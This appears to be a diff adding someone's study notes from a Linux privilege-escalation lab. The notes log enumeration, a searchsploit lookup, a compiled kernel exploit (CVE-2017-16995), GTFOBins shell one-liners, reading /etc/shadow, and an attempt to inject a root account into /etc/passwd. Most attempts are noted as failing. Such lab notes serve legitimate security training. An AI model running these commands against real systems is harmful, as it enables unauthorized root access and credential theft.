@@ -1,0 +1,133 @@
+Linux privilege escalation
+
+Abusing Setuid Binaries and Capabilities
+
+attacker 192.168.49.56
+target 192.168.56.214 joe/offsec
+
+ssh -l joe 192.168.56.214
+
+/usr/sbin/getcap -r / 2>/dev/null
+
+/usr/bin/gdb = cap_setuid+ep
+
+GTFOBins:
+gdb -nx -ex '!/bin/sh' -ex quit
+failed !
+
+how to abuse gdb command capabilities to gain a root shell in linux?
+
+------
+Exploiting Kernel Vulnerabilities
+
+attacker 192.168.49.56
+target 192.168.56.216 joe/offsec
+
+ssh -l joe 192.168.56.216
+
+/usr/sbin/getcap -r / 2>/dev/null
+no output
+
+sudo -l
+Sorry, user joe may not run sudo on ubuntu-privesc.
+
+hostname
+cat /etc/issue
+cat /etc/os-release
+uname -r
+arch
+
+ubuntu-privesc
+Ubuntu 16.04.4 LTS \n \l
+NAME="Ubuntu"
+VERSION="16.04.4 LTS (Xenial Xerus)"
+4.4.0-116-generic
+x86_64
+
+ps aux
+ip a
+routel
+ss -anp
+watch -n 1 "ps -aux"
+tcpdump
+
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Esca | linux/local/45010.c
+
+cp /usr/share/exploitdb/exploits/linux/local/45010.c .
+head 45010.c -n 20
+mv 45010.c cve-2017-16995.c
+scp cve-2017-16995.c joe@192.168.56.216:
+
+gcc cve-2017-16995.c -o cve-2017-16995
+file cve-2017-16995
+./cve-2017-16995
+
+[!] failed to create bpf map: 'Operation not permitted' !
+id
+
+ls -lah /etc/cron*
+grep "CRON" /var/log/syslog
+
+crontab -l
+no crontab for joe
+
+find / -writable -type d 2>/dev/null
+
+find / -perm -u=s -type f 2>/dev/null
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/sudo
+/usr/bin/newuidmap
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/pkexec
+/bin/su
+/bin/fusermount
+/bin/ping
+/bin/ntfs-3g
+/bin/mount
+/bin/umount
+/bin/ping6
+pkexec, mount, passwd failed ! (gtfobins)
+
+/usr/share/unix-privesc-check
+scp unix-privesc-check joe@192.168.56.216:
+./unix-privesc-check standard > output.txt
+./unix-privesc-check: 1076: [: standard: unexpected operator !
+
+cat /etc/passwd
+cat /etc/shadow
+
+cat /etc/fstab 
+mount
+lsblk
+lsmod
+env
+cat .bashrc
+
+openssl passwd w00t
+echo "root2:6mYo.OzRG0A6U:0:0:root:/root:/bin/bash" >> /etc/passwd 
+Permission denied !
+su root2
+
+find /home/joe -exec "/bin/bash" -p \;
+whoami
+still joe, failed !
+
+
+
+
+
+
+
